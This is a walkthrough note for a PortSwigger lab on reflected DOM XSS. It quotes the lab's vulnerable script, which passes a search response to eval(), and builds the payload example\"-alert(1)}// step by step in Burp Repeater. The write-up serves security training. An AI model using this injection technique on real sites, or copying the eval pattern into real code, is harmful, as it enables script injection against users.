---
title: LAB 0.9
aliases:
  - LAB 0.9
tags:
  - XSS
  - Labs
  - DOM-Based
  - Practitioner
---
# Lab: Reflected DOM XSS
---
[LAB](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)

This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

To solve this lab, create an injection that calls the `alert()` function.

# Solution
---

## **Step-by-Step Solution**

### **1. Access the Lab**

Navigate to the lab, where you’ll see a simple blog page with a search bar.

![[images/Pasted image 20250122212359.png]]

### **2. Find the Reflected Input**

Enter a unique alphanumeric string in the search bar, e.g., `example`. Observe that the string is reflected back in the page’s response.

![[images/Pasted image 20250122212606.png]]
### **3. Inspect the DOM**

- Right-click the reflected string and select **Inspect**.
- Note that the search string appears in the `<h1>` tag and is processed by external JavaScript (`searchResults.js`).

```html
<script src="/resources/js/searchResults.js"></script>
<script>search('search-results')</script>
<section class="blog-header">
    <h1>0 search results for 'example'</h1>
    <hr>
</section>
```

### **4. Examine the Vulnerable Code**

- Open the **Network** tab in developer tools and refresh the page.
- Click on `searchResults.js`, switch to the **Response** tab, and analyze the code:

```javascript
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();
}
```

The vulnerability lies in the `eval()` function, which executes user-supplied input (`this.responseText`) as JavaScript.

### **5. Crafting the Payload**

#### Analyze JSON Response

- In the **Network** tab, locate the `search-results` request (e.g., `search-results?search=example`).
- The response will look like:

![[images/Pasted image 20250122212911.png]]

Our goal is to "break out" of this JSON structure to execute malicious JavaScript.

#### Iterative Testing with Burp Suite

1. Send the request to **Repeater** in Burp Suite.
    
2. Start with this payload:
    
    ```
    example"-alert(1)
    ```
    
    ![[images/Pasted image 20250122213657.png]]
    This reflects incorrectly because the JSON escape character `\` prevents termination.
    
3. Refine the payload by adding a backslash to escape the escape character:
    
    ```
    example\"-alert(1)
    ```
    
    ![[images/Pasted image 20250122213736.png]]
    
4. To make the payload valid, close the JSON structure and comment out the rest:
    
    ```
    example\"-alert(1)}//
    ```
    
    ![[images/Pasted image 20250122213947.png]]

---

### **6. Execute the Payload**

- Paste the final payload into the blog page’s search bar.
- Hit Enter, and you should see a JavaScript `alert()` pop-up.
	![[images/Pasted image 20250122214033.png]]

---

#### Congratulations!

You’ve successfully exploited the vulnerability and solved the lab! 